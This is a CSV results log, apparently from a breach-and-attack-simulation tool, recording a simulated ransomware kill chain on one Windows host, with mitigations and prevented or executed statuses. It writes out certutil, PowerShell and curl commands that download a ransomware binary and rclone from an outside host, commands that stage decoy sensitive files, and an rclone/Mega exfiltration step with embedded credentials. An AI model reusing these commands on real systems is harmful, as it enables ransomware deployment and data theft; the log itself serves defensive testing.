@@ -1,0 +1,204 @@
+"SR NO               ","RESPONSE DATE                           ","ACTION NAME                   ","HOST                          ","PLATFORM                                               ","COMMAND                       ","OUTPUT                                            ","MITIGATION                         ","STATUS                   ","USERNAME                      "
+"1                   ","2026-08-27 14:04                        ","List Public Directory Content ","D144FL803                     ","windows                                                ","dir C:\Users\Public\          ","Volume in drive C has no label.
+ Volume Serial Number is ACE3-1BE3
+
+ Directory of C:\Users\Public
+
+24-07-2026  12:08    <DIR>          .
+19-08-2026  15:25    <DIR>          ..
+30-07-2025  17:29    <DIR>          BasAgent
+29-06-2026  13:29             1,054 Document.lnk
+10-12-2025  14:47    <DIR>          Documents
+19-08-2026  15:25    <DIR>          Downloads
+27-04-2026  13:35    <JUNCTION>     J [C:\Windows\System32\config]
+27-04-2026  13:35    <SYMLINK>      L [C:\Users\Public\J\SYSTEM]
+19-08-2026  15:25    <DIR>          Music
+19-08-2026  15:25    <DIR>          Pictures
+10-12-2025  12:49            14,501 RTMDisabler.exe
+24-07-2026  12:02    <DIR>          simulation
+24-07-2026  12:02    <DIR>          Trojan
+19-08-2026  15:25    <DIR>          Videos
+24-07-2026  12:02               830 windows_update.cer
+24-07-2026  12:02    <DIR>          Worm
+               4 File(s)         16,385 bytes
+              12 Dir(s)  39,812,661,248 bytes free","1. Use application control where appropriate.","Executed                 ","NT AUTHORITY\SYSTEM           "
+"2                   ","2026-08-27 14:04                        ","Download TheGentleman ransomware binary via Certutil","D144FL803                     ","windows                                                ","certutil -urlcache -split -f https://aqbspdm.com/Payloads/TheGentlemenBAS.exe C:\Users\Public\TheGentlemenBAS.exe && dir C:\Users\Public\TheGentlemenBAS.exe","Access is denied.                                 ","1. A patch management process should be implemented to check unused dependencies, unmaintained and/or previously vulnerable dependencies, unnecessary features, components, files, and documentation.
+2. Continuous monitoring of vulnerability sources and the use of automatic and manual code review tools should also be implemented as well.","Prevented                ","NT AUTHORITY\SYSTEM           "
+"3                   ","2026-08-27 14:04                        ","Download TheGentleman ransomware binary via Invoke-WebRequest","D144FL803                     ","windows                                                ","Invoke-WebRequest -Uri ""https://aqbspdm.com/Payloads/TheGentlemenBAS.exe"" -OutFile ""C:\Users\Public\TheGentlemenBAS.exe"" -SkipCertificateCheck ; dir C:\Users\Public\TheGentlemenBAS.exe
+","Invoke-WebRequest : A parameter cannot be found that matches parameter name 'SkipCertificateCheck'.
+At line:1 char:122
++ ... e ""C:\Users\Public\TheGentlemenBAS.exe"" -SkipCertificateCheck ; dir C ...
++                                             ~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidArgument: (:) [Invoke-WebRequest], ParameterBindingException
+    + FullyQualifiedErrorId : NamedParameterNotFound,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+ 
+dir : Cannot find path 'C:\Users\Public\TheGentlemenBAS.exe' because it does not exist.
+At line:1 char:146
++ ... .exe"" -SkipCertificateCheck ; dir C:\Users\Public\TheGentlemenBAS.exe
++                                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\Users\Public\TheGentlemenBAS.exe:String) [Get-ChildItem], ItemNotFou 
+   ndException
+    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand","1. A patch management process should be implemented to check unused dependencies, unmaintained and/or previously vulnerable dependencies, unnecessary features, components, files, and documentation.
+2. Continuous monitoring of vulnerability sources and the use of automatic and manual code review tools should also be implemented as well.","Prevented                ","NT AUTHORITY\SYSTEM           "
+"4                   ","2026-08-27 14:04                        ","Download TheGentleman Ransomware","D144FL803                     ","windows                                                ","curl.exe -k https://aqbspdm.com/Payloads/TheGentlemenBAS.exe -o C:\Users\Public\TheGentlemenBAS.exe && dir C:\Users\Public\TheGentlemenBAS.exe","curl: (6) Could not resolve host: aqbspdm.com     ","1. A patch management process should be implemented to check unused dependencies, unmaintained and/or previously vulnerable dependencies, unnecessary features, components, files, and documentation.
+2. Continuous monitoring of vulnerability sources and the use of automatic and manual code review tools should also be implemented as well.","Prevented                ","NT AUTHORITY\SYSTEM           "
+"5                   ","2026-08-27 14:04                        ","Copy files from Aquilai Folder for TheGentleman","D144FL803                     ","windows                                                ","xcopy ""C:\Program Files (x86)\Aquilai\BasAgent\Payloads\*"" ""C:\Users\Public\Files_Gentleman\"" /E /I /Y","C:\Program Files (x86)\Aquilai\BasAgent\Payloads\CCN_Visa_Amex_Card_details.csv
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\CCN_Visa_Amex_Card_Details.docx
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\CCN_Visa_Amex_Card_details.html
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\CCN_Visa_Amex_Card_details.json
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\CCN_Visa_Amex_Card_details.pdf
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\CCN_Visa_Amex_Card_Details.rtf
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\CCN_Visa_Amex_Card_details.txt
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\CCN_Visa_Amex_Card_details.xls
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\CCN_Visa_Amex_Card_details.xlsx
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\credit_card.csv
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\credit_card.docx
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\credit_card.html
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\credit_card.json
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\credit_card.pdf
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\credit_card.rtf
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\credit_card.txt
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\credit_card.xls
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\credit_card.xlsx
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\credit_card_details.csv
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\credit_card_details.docx
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\credit_card_details.html
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\credit_card_details.json
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\credit_card_details.pdf
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\credit_card_details.rtf
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\credit_card_details.txt
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\credit_card_details.xls
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\credit_card_details.xlsx
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\Patient_Medical_Record.csv
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\Patient_Medical_Record.docx
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\Patient_Medical_Record.pdf
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\Patient_Medical_Record.rtf
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\Patient_Medical_Record.txt
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\Patient_Medical_Record.xls
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\Patient_Medical_Record.xlsx
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\Personal_Data.csv
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\Personal_Data.docx
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\Personal_Data.html
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\Personal_Data.json
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\Personal_Data.pdf
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\Personal_Data.rtf
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\Personal_Data.txt
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\Personal_Data.xls
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\Personal_Data.xlsx
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\Personal_Health_Record.csv
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\Personal_Health_Record.docx
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\Personal_Health_Record.html
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\Personal_Health_Record.json
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\Personal_Health_Record.pdf
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\Personal_Health_Record.rtf
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\Personal_Health_Record.txt
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\Personal_Health_Record.xls
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\Personal_Health_Record.xlsx
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\source_code.csv
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\source_code.docx
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\source_code.html
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\source_code.json
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\source_code.pdf
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\source_code.rtf
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\source_code.txt
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\source_code.xls
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\source_code.xlsx
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\U.S._Social_Security_Numbers.docx
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\U.S._Social_Security_Numbers.rtf
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\U.S_Social_Security_Numbers.csv
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\U.S_Social_Security_Numbers.json
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\U.S_Social_Security_Numbers.pdf
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\U.S_Social_Security_Numbers.xls
+C:\Program Files (x86)\Aquilai\BasAgent\Payloads\U.S_Social_Security_Numbers.xlsx
+68 File(s) copied","                                   ","Executed                 ","NT AUTHORITY\SYSTEM           "
+"6                   ","2026-08-27 14:04                        ","Run TheGentleman Ransomware   ","D144FL803                     ","windows                                                ","cmd /c C:\Users\Public\TheGentlemenBAS.exe ""C:\Users\Public\Files_Gentleman""","'C:\Users\Public\TheGentlemenBAS.exe' is not recognized as an internal or external command,
+operable program or batch file.","1. Use application control where appropriate.","Prevented                ","NT AUTHORITY\SYSTEM           "
+"7                   ","2026-08-27 14:04                        ","Verify Ouput of TheGentleman  ","D144FL803                     ","windows                                                ","dir C:\Users\Public\Files_Gentleman","Volume in drive C has no label.
+ Volume Serial Number is ACE3-1BE3
+
+ Directory of C:\Users\Public\Files_Gentleman
+
+27-08-2026  14:05    <DIR>          .
+27-08-2026  14:05    <DIR>          ..
+24-04-2024  17:09             6,804 CCN_Visa_Amex_Card_details.csv
+16-12-2024  16:57            36,686 CCN_Visa_Amex_Card_Details.docx
+22-08-2025  11:49            14,810 CCN_Visa_Amex_Card_details.html
+22-08-2025  11:49             7,916 CCN_Visa_Amex_Card_details.json
+04-02-2025  16:07            10,520 CCN_Visa_Amex_Card_details.pdf
+16-12-2024  16:57               157 CCN_Visa_Amex_Card_Details.rtf
+22-09-2025  17:09             6,703 CCN_Visa_Amex_Card_details.txt
+16-12-2024  17:41            20,992 CCN_Visa_Amex_Card_details.xls
+22-09-2025  17:08            12,369 CCN_Visa_Amex_Card_details.xlsx
+08-04-2024  14:36             4,748 credit_card.csv
+16-12-2024  16:56            36,676 credit_card.docx
+22-09-2025  17:09            11,657 credit_card.html
+22-09-2025  17:08             5,772 credit_card.json
+16-12-2024  17:12             8,371 credit_card.pdf
+16-12-2024  16:56               156 credit_card.rtf
+22-09-2025  17:08             4,717 credit_card.txt
+16-12-2024  17:41            17,920 credit_card.xls
+16-12-2024  17:51            11,203 credit_card.xlsx
+24-04-2024  17:09             6,804 credit_card_details.csv
+16-12-2024  16:57            36,684 credit_card_details.docx
+07-01-2026  17:42            14,810 credit_card_details.html
+07-01-2026  17:39             7,916 credit_card_details.json
+07-01-2026  17:37            10,520 credit_card_details.pdf
+16-12-2024  16:57               163 credit_card_details.rtf
+07-01-2026  17:40             6,703 credit_card_details.txt
+16-12-2024  17:42            20,992 credit_card_details.xls
+07-01-2026  17:38            12,369 credit_card_details.xlsx
+16-12-2024  17:44             2,086 Patient_Medical_Record.csv
+16-12-2024  16:56            36,685 Patient_Medical_Record.docx
+29-04-2024  12:49           796,701 Patient_Medical_Record.pdf
+16-12-2024  16:56               163 Patient_Medical_Record.rtf
+18-05-2026  15:08             2,086 Patient_Medical_Record.txt
+16-12-2024  17:44             9,216 Patient_Medical_Record.xls
+16-12-2024  16:47             5,479 Patient_Medical_Record.xlsx
+24-04-2024  20:38             1,858 Personal_Data.csv
+16-12-2024  16:57            36,710 Personal_Data.docx
+30-07-2025  17:34             3,817 Personal_Data.html
+30-07-2025  17:32             2,132 Personal_Data.json
+30-07-2025  17:30             3,431 Personal_Data.pdf
+16-12-2024  16:57               186 Personal_Data.rtf
+30-07-2025  17:33             1,837 Personal_Data.txt
+16-12-2024  17:43             9,728 Personal_Data.xls
+30-07-2025  17:31             8,058 Personal_Data.xlsx
+16-12-2024  17:44             2,340 Personal_Health_Record.csv
+16-12-2024  16:57            36,677 Personal_Health_Record.docx
+22-09-2025  17:12             3,251 Personal_Health_Record.html
+22-09-2025  17:11             2,431 Personal_Health_Record.json
+24-04-2024  18:18           502,180 Personal_Health_Record.pdf
+16-12-2024  16:57               147 Personal_Health_Record.rtf
+22-09-2025  17:11             2,296 Personal_Health_Record.txt
+16-12-2024  17:44             9,216 Personal_Health_Record.xls
+16-12-2024  16:49             6,700 Personal_Health_Record.xlsx
+16-12-2024  16:52               482 source_code.csv
+16-12-2024  16:57            36,669 source_code.docx
+30-07-2025  17:36               922 source_code.html
+22-01-2025  10:12               609 source_code.json
+04-02-2025  16:07             1,569 source_code.pdf
+16-12-2024  16:57               115 source_code.rtf
+30-07-2025  17:35               462 source_code.txt
+16-12-2024  17:43             6,656 source_code.xls
+04-02-2025  16:48             6,488 source_code.xlsx
+16-12-2024  16:57            36,666 U.S._Social_Security_Numbers.docx
+16-12-2024  16:57               125 U.S._Social_Security_Numbers.rtf
+24-04-2024  20:33           496,010 U.S_Social_Security_Numbers.csv
+17-01-2025  15:04           642,913 U.S_Social_Security_Numbers.json
+24-07-2026  12:49           958,158 U.S_Social_Security_Numbers.pdf
+16-12-2024  17:42         1,614,848 U.S_Social_Security_Numbers.xls
+17-01-2025  15:03           359,002 U.S_Social_Security_Numbers.xlsx
+              68 File(s)      5,982,243 bytes
+               2 Dir(s)  39,774,425,088 bytes free","1. This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties.","Executed                 ","NT AUTHORITY\SYSTEM           "
+"8                   ","2026-08-27 14:04                        ","Download Rclone and Mega exfiltration script","D144FL803                     ","windows                                                ","curl.exe -k https://aqbspdm.com/Payloads/rclone.exe -o C:\Users\Public\rclone.exe && curl.exe -k https://aqbspdm.com/Payloads/mega.ps1 -o C:\Users\Public\mega.ps1","curl: (6) Could not resolve host: aqbspdm.com     ","1. A patch management process should be implemented to check unused dependencies, unmaintained and/or previously vulnerable dependencies, unnecessary features, components, files, and documentation.
+2. Continuous monitoring of vulnerability sources and the use of automatic and manual code review tools should also be implemented as well.","Prevented                ","NT AUTHORITY\SYSTEM           "
+"9                   ","2026-08-27 14:04                        ","Configure credentials for rclone","D144FL803                     ","windows                                                ","C:\Users\Public\rclone.exe config create mega mega user ""purple.ayaan2026@gmail.com"" pass ""bas@aquilai""","'C:\Users\Public\rclone.exe' is not recognized as an internal or external command,
+operable program or batch file.","1. Use application control where appropriate.","Prevented                ","NT AUTHORITY\SYSTEM           "
+"10                  ","2026-08-27 14:04                        ","Exfiltrate TheGentleman       ","D144FL803                     ","windows                                                ","C:\Users\Public\mega.ps1 -Folder ""Files_Gentleman""","C:\Users\Public\mega.ps1 : The term 'C:\Users\Public\mega.ps1' is not recognized as the name of a cmdlet, function, 
+script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is 
+correct and try again.
+At line:1 char:1
++ C:\Users\Public\mega.ps1 -Folder ""Files_Gentleman""
++ ~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\Users\Public\mega.ps1:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException","1. Web proxies can be used to enforce an external network communication policy that prevents use of unauthorized external services.","Prevented                ","NT AUTHORITY\SYSTEM           "
